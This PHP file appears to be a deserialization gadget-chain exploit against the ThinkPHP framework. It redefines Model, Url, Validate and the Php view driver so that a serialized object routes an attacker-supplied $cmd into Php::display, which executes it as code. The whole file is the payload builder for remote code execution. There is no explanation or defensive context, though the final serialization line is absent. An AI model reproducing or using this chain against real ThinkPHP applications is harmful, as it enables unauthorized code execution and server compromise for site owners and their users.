<?php
namespace think\model\concern{
    trait Attribute{
        private $data = [7];
    }
}

namespace think\view\driver{
    class Php{}
}

namespace think{
    abstract class Model{
        use model\concern\Attribute;
        private $lazySave;
        protected $withEvent;
        protected $table;
        function __construct($cmd){
            $this->lazySave = true;
            $this->withEvent = false;
            $this->table = new route\Url(new Middleware,new Validate,$cmd);
        }
    }
    class Middleware{
        public $request = 2333;
    }
    class Validate{
        protected $type;
        function __construct(){
             $this->type = [
                "getDomainBind" => [new view\driver\Php,'display']
            ];
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{} 
}

namespace think\route{
    class Url
    {
        protected $url = 'a:';
        protected $domain;
        protected $app;
        protected $route;
        function __construct($app,$route,$cmd){
            $this->domain = $cmd;
            $this->app = $app;
            $this->route = $route;
        }
    }
}